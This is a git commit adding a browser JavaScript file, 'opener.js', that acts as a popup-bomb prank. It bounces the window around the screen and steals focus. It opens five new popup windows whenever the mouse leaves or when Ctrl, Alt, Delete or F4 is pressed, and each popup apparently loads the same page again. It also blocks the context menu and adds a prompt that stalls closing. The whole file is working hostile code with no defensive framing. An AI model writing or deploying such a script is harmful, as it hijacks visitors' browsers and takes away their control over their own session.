5b9fabe02ef6f2d0d66c30c742dfe44f4141b866
Valux <appleuser4772@gmail.com>
2024-10-15 13:55:28 -0400

    Create opener.js

---
+++ opener.js
@@ -0,0 +1,93 @@
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function changeTitle(title) {
+	document.title = title;
+}
+
+function openWindow(url) {
+	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+}
+
+function proCreate() {	
+	for (var i = 0; i < 5; i++) {
+		openWindow('sillyopener.html');
+	}
+}
+
+function newXlt() {
+	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function newXrt() {
+	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
+	window.focus();
+}
+
+function newYup() {
+	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function newYdn() {
+	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function fOff(){
+	flagRun = 0;
+}
+
+function playBall() {
+    xPos += xOff;
+    yPos += yOff;
+    
+	if (xPos > screen.width - 357) newXlt();    
+	if (xPos < 0) newXrt();
+    
+	if (yPos > screen.height - 330) newYup(); 		
+	if (yPos < 0) newYdn();
+    
+	if (flagRun == 1) {
+        window.moveTo(xPos, yPos);
+        setTimeout('playBall()', 1);
+    }
+}
+
+window.onload = function () {
+	flagRun = 1;
+	
+	playBall();
+	
+	return true;
+}
+
+window.onmouseout = function () {
+	proCreate();
+
+	return null;
+};
+
+window.oncontextmenu = function() {
+	
+	return false;
+}
+
+window.onkeydown = function() {	
+	var keyCode = event.keyCode;
+	
+	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
+		alert("Silly"); 
+		proCreate();
+	}
+	
+	return null;
+}
+
+window.onbeforeunload = function() {
+    return "Silly";
+};
